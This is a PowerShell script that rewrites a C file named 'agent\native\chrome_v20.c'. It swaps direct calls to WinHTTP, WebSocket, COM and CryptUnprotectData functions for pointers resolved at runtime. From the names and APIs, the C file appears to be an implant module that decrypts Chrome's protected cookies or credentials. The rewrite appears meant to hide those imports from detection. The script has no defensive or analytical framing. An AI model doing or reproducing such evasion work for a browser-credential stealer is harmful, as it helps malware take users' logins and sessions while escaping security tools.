$f = 'agent\native\chrome_v20.c'
$c = Get-Content $f -Raw

# WinHTTP — replace direct calls with resolved pointers
# Use word boundary to avoid replacing p_WinHttp* or fn_WinHttp*
$replacements = @{
    '(?<![_a-zA-Z])WinHttpOpen\(' = 'p_WinHttpOpen('
    '(?<![_a-zA-Z])WinHttpConnect\(' = 'p_WinHttpConnect('
    '(?<![_a-zA-Z])WinHttpOpenRequest\(' = 'p_WinHttpOpenRequest('
    '(?<![_a-zA-Z])WinHttpSendRequest\(' = 'p_WinHttpSendRequest('
    '(?<![_a-zA-Z])WinHttpReceiveResponse\(' = 'p_WinHttpReceiveResponse('
    '(?<![_a-zA-Z])WinHttpReadData\(' = 'p_WinHttpReadData('
    '(?<![_a-zA-Z])WinHttpCloseHandle\(' = 'p_WinHttpCloseHandle('
    '(?<![_a-zA-Z])WinHttpSetOption\(' = 'p_WinHttpSetOption('
    '(?<![_a-zA-Z])WinHttpWebSocketCompleteUpgrade\(' = 'p_WinHttpWebSocketCompleteUpgrade('
    '(?<![_a-zA-Z])WinHttpWebSocketSend\(' = 'p_WinHttpWebSocketSend('
    '(?<![_a-zA-Z])WinHttpWebSocketReceive\(' = 'p_WinHttpWebSocketReceive('
    '(?<![_a-zA-Z])WinHttpWebSocketClose\(' = 'p_WinHttpWebSocketClose('
    '(?<![_a-zA-Z])CoCreateInstance\(' = 'p_CoCreateInstance('
    '(?<![_a-zA-Z])CoInitializeEx\(' = 'p_CoInitializeEx('
    '(?<![_a-zA-Z])CryptUnprotectData\(' = 'p_CryptUnprotectData('
}

foreach ($k in $replacements.Keys) {
    $before = ([regex]::Matches($c, $k)).Count
    $c = [regex]::Replace($c, $k, $replacements[$k])
    Write-Host "  $k => $($replacements[$k])  ($before replacements)"
}

Set-Content $f $c -NoNewline
Write-Host "DONE - chrome_v20.c updated"
